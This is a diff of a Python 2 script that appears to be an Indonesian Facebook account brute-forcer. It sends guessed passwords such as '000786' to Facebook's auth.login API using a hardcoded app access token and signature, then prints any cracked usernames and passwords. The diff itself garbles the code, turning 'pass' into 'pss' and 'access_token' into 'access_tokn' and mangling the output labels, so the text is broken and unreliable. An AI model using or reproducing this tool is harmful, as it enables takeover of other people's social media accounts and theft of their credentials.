@@ -16,7 +16,7 @@ br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 
 def keluar():
-	print "\033[1;96m[!] \x1b[1;91mExit"
+	 "\033[1;96m[!] \x1b[1;91mExit"
 	os.sys.exit()
 
 
@@ -295,7 +295,7 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass 
+			pss 
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
@@ -344,7 +344,7 @@ def pilih_super():
 									pass4 = '000786'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
-									if 'access_token' in q:
+									if 'access_tokn' in q:
 										print '\x1b[1;92m[OK] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass4 + '\n'
 										oks.append(user+pass4)
 									else:
@@ -433,8 +433,8 @@ def brute():
                         dapat.close()
                         print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                         print 52 * '\x1b[1;97m\xe2\x95\x90'
-                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
-                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUseame \x1b[1;91m:\x1b[1;97m ' + email
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPaord \x1b[1;91m:\x1b[1;97m ' + pw
                         keluar()
                     else:
                         if 'www.facebook.com' in mpsh['error_msg']:
@@ -444,8 +444,8 @@ def brute():
                             print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                             print  "\033[1;36;40m ●════════════════════════☠════════════════════════●"
                             print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
-                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
-                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
+                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUname \x1b[1;91m:\x1b[1;97m ' + email
+                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPaword \x1b[1;91m:\x1b[1;97m ' + pw
                             keluar()
                 except requests.exceptions.ConnectionError:
                     print '\x1b[1;91m[!] Connection Error'
